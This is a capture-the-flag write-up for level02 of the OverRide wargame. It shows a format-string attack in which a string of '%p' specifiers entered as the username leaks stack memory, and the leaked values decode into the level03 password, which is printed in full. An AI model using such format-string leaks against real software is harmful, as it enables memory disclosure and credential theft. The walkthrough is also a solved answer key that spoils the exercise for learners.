After analyzing the source code, we can see that it executes /bin/sh only if the password matches the flag.

We also noticed the code use a `printf` with just an argument, a variable used to display the username. So the `printf` is vulnerable to format string attack.

First, let's test this:

```Shell
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20 (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

Since we know that the program has open the .pass file we search for a address that look's like a string and can be the passcode :
First we check : `0x2a2a2a2a2a2a2a2a` => `"********"`
After we check this : `0x7025207025207025` => `"p% p% p%"`
And then we check : `0x756e505234376848` => `"unPR47hH"`, ok this looks more like passcode let's try to get the full string

Since it is a string we know that there is a `\0` or here a `(nil)` at the end. So let's get the part which is situated between two (nil) values.

`0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`

</br>
Now we will change the format form little endian to big Endian:

Little Endian : `0x756E505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`

&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↓&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↓&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↓&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↓&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;↓</pre>

Big Endian : &nbsp;`0x4868373452506E75 0x51397361354A4145 0x58674E5743717A37 0x7358476E68354A35 0x4D394B6650673348`
Converted to ascii this gives us: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.

Let's try this:

```Shell
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
```
